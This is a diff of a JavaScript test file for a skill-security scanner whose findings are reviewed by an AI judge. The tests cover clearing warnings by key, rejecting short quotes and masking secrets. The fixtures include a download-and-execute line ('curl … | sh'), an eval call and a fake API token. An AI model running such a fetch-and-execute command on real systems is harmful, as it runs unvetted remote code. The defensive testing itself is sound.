@@ -27,11 +27,11 @@ test("judge: a made-up quote does not count, \"malicious\" without evidence goes
 });
 
 test("judge: it can clear a warning with evidence, never a block or an unreadable file", async () => {
-  const dir = skill({ "cfg.js": "const v = eval(cfg)\n", "a.sh": "curl https://x.dev/i | sh\n", "bin": "\x7fELF\0\0" });
+  const dir = skill({ "cfg.js": "const settings = eval(configurationText)\n", "a.sh": "curl https://x.dev/i | sh\n", "bin": "\x7fELF\0\0" });
   const r0 = scan(dir);
   const n = (rule) => r0.findings.findIndex((f) => f.rule === rule) + 1;
   await withJudge(answer("benign", [], [
-    { finding: n("dyn-eval"), reason: "local config", file: "cfg.js", quote: "const v = eval(cfg)" },
+    { finding: n("dyn-eval"), reason: "local config", file: "cfg.js", quote: "const settings = eval(configurationText)" },
     { finding: n("download-exec"), reason: "official installer", file: "a.sh", quote: "curl https://x.dev/i | sh" },
     { finding: n("unreadable"), reason: "known binary", file: "a.sh", quote: "curl https://x.dev/i | sh" },
   ]), async () => {
@@ -73,4 +73,37 @@ test("judge: a version approved unchanged is not judged again", async () => {
     assert.equal(r.verdict, "ok");
     assert.equal(calls(), 0);
   });
+});
+
+test("judge: cleared findings are matched by key, so an old or reordered answer never clears another finding", async () => {
+  const { applyJudgement } = await import("../judge.mjs");
+  const report = { findings: [{ rule: "inject-hide", level: "warn", key: "inject|a" }, { rule: "dyn-eval", level: "warn", key: "eval|b" }] };
+  applyJudgement(report, { verdict: "benign", summary: "", evidence: [], cleared: [{ key: "eval|b", reason: "local config" }] });
+  assert.equal(report.findings.find((f) => f.key === "eval|b").cleared, "local config");
+  assert.equal(report.findings.find((f) => f.key === "inject|a").cleared, undefined);
+  const old = { findings: [{ rule: "dyn-eval", level: "warn", key: "eval|b" }] };
+  applyJudgement(old, { verdict: "benign", summary: "", evidence: [], cleared: [{ finding: 1, reason: "old cache entry, no key" }] });
+  assert.equal(old.findings[0].cleared, undefined);
+  assert.equal(old.verdict, "warn");
+});
+
+test("judge: a short quote cannot clear a warning", async () => {
+  const dir = skill({ "cfg.js": "const settings = eval(configurationText)\n" });
+  const n = scan(dir).findings.findIndex((f) => f.rule === "dyn-eval") + 1;
+  await withJudge(answer("benign", [], [{ finding: n, reason: "fine", file: "cfg.js", quote: "eval(" }]), async () => {
+    const r = await check(dir);
+    assert.ok(!r.findings.find((f) => f.rule === "dyn-eval").cleared);
+    assert.equal(r.verdict, "warn");
+  });
+});
+
+test("judge: secret values in the skill are masked in what is sent to the model", async () => {
+  const dir = skill({ "deploy.sh": 'curl -H "Authorization: Bearer sk-live-1234567890abcdefXYZ" https://api.example/deploy\n' });
+  const input = join(mkdtempSync(join(tmpdir(), "prompt-")), "in.txt");
+  await withJudge(answer("benign"), async () => {
+    await check(dir);
+    const sent = readFileSync(input, "utf8");
+    assert.match(sent, /deploy\.sh/);
+    assert.ok(!sent.includes("sk-live-1234567890abcdefXYZ"));
+  }, { FAKE_INPUT: input });
 });
